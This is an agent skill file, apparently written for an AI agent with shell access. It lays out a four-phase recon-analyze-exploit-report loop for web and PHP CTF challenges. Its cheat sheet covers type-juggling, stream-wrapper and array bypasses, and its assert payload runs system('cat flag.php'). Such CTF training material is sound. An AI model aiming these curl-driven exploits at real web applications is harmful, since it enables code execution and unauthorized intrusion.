---
name: secagent-methodology
description: 安全攻击方法论。加载后获得 4 阶段渗透测试循环、CVE 匹配、防御绕过、观察→假设映射。
tools: exec_shell, web_search, fetch_url, read_file, write_file, agent_spawn
---

# SecAgent Methodology

加载此 SKILL 后，按以下流程执行任何安全任务。不跳过任何步骤。

## Phase 1: RECON (侦察 — 必须第一步)

```
1. 获取目标基本信息:
   curl -s <target> | head -100          # 取首页
   curl -s -I <target>                    # 取 headers

2. 分析返回内容:
   - 识别技术栈 (Server header, HTML 特征, 错误页面)
   - 识别语言/框架 (PHP/Node/Python/Java/.NET)
   - 识别入口点 (GET params, POST forms, API endpoints)

3. 如果是 CTF 题目:
   - 读源码 → 识别所有输入点和检查点
   - 列出每个检查点的绕过方法
   - 不需要 spawn agent (CTF 是单人解题) — 直接分析
```

## Phase 2: ANALYZE (分析 — 从观察到假设)

```
1. 列出所有输入点和对应的安全检查

2. 对每个检查点匹配绕过技术:
   file_get_contents($user_input)     → data:// or php:// wrapper
   intval($x) !== N || $x === N       → type juggle: string "N" != int N
   strlen($x) == N                    → pad to exact length
   preg_match(/pattern/, $x) && !is_numeric($x) → check regex for tricks
   substr($x, N) === sha1($x)         → 计算不可行 → array bypass (sha1([])=NULL)
   assert("string with \$var")        → 变量注入 or RCE
   $$var                              → variable variable attack
   foreach($_GET as $k=>$v){$$k=$v;}  → mass variable overwrite

3. 识别障眼法 (red herring):
   - 计算不可行的检查 (SHA1 preimage, hash collision)
   - 被后续步骤覆盖的变量
   - 永远不执行的代码分支 (die() 之后的代码)
   - 攻击者不需要通过的检查 (有其他路径绕过)

4. 形成假设: H-id: {vuln} exploitable via {technique}. Test: {specific payload}
   每个假设: 0-1 置信度
```

## Phase 3: EXPLOIT (利用 — 系统验证)

```
1. 按置信度排序假设，最高的先测

2. 构造最小 PoC:
   curl -s "<url>?param1=val1&param2=val2"

3. 观察输出:
   - "Good Job" / flag{...} → CONFIRMED
   - 错误信息 / 无输出 → 分析原因
     a. payload 格式错? → 修正 curl 的 shell 转义
     b. 检查点没绕过? → 修正参数值
     c. 目标有额外防护? → 换技术

4. CONCLUDE:
   CONFIRMED → 提取 flag, 记录 exploit
   DISPROVEN → 记录原因, 下一个假设
```

## Phase 4: REPORT (报告)

```
成功后的总结模板:

## Flag: {flag}
## Exploit Chain:
| Step | Checkpoint | Technique | Payload |
|------|-----------|-----------|---------|
| 1    | {name}    | {how}     | {what}  |
| ...

## Key Insight:
{最重要的发现 — 障眼法? 关键绕过?}
```

## 速查: 常见 CTF PHP 绕过

```
类型混淆:
  intval("1337")=1337, "1337"!==1337 → pass
  "1337"==1337 (loose) → true
  "1337abc"==1337 (loose) → true (PHP 7.x), false (PHP 8.x)

Wrapper:
  data://text/plain,Hello%20Challenge!
  data://text/plain;base64,SGVsbG8gQ2hhbGxlbmdlIQ==
  php://input (POST body)

Array bypass:
  sha1([]) = NULL, substr([],42) = NULL → NULL === NULL ✓
  md5([]) = NULL (same trick)

Regex tricks:
  Unicode chars: ＄(U+FF04) ≠ $(U+0024)
  preg_match returns 0 (falsy) or 1 (truthy)
  /\d+＄/ matches strings starting with digits containing U+FF04

Assert RCE:
  assert("42 == $cc") with $cc = "1337 || system('cat flag.php'); //"
  → evaluates PHP code, need PHP < 8 or assert.active=1
  ASSERT_BAIL: script dies after false assert, but side effects execute

Variable Variables:
  $$a where $a='b' → resolves to $b
  RTL override (U+202E) can visually hide the real variable name
```

## 执行规则

```
- 先 curl 看返回，再分析，再发 exploit
- 每一步都看输出。不要猜。
- Shell 转义: curl URL 用单引号 '...' 包裹，防止 shell 展开 $ 变量
- 一次发一个 exploit，看清结果再调
- CTF 题不需要 spawn agent — 直接分析
```
